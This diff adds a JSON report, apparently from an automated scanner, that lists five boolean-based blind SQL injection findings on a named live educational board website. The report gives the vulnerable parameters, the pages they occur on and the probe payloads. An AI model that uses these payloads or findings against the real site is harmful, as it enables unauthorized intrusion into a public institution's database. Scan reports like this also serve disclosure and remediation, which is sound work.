@@ -1,0 +1,56 @@
+{
+  "success": true,
+  "target": "https://www.pseb.ac.in/",
+  "deep_scan": true,
+  "total_vulnerabilities": 5,
+  "risk_score": 100,
+  "vulnerabilities": [
+    {
+      "parameter": "catid",
+      "payload": "31' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.pseb.ac.in/books",
+      "timestamp": "2026-06-10T17:07:58.295467"
+    },
+    {
+      "parameter": "catid",
+      "payload": "141' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.pseb.ac.in/syllabus",
+      "timestamp": "2026-06-10T17:08:18.557546"
+    },
+    {
+      "parameter": "catid",
+      "payload": "101' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.pseb.ac.in/questionpaper",
+      "timestamp": "2026-06-10T17:08:35.050393"
+    },
+    {
+      "parameter": "catid",
+      "payload": "61' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.pseb.ac.in/question-paper-manager",
+      "timestamp": "2026-06-10T17:08:48.581105"
+    },
+    {
+      "parameter": "keys",
+      "payload": "1' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.pseb.ac.in/search",
+      "timestamp": "2026-06-10T17:09:02.603450"
+    }
+  ],
+  "scan_id": "a5963cbb",
+  "timestamp": "2026-06-10T17:09:02.604547"
+}
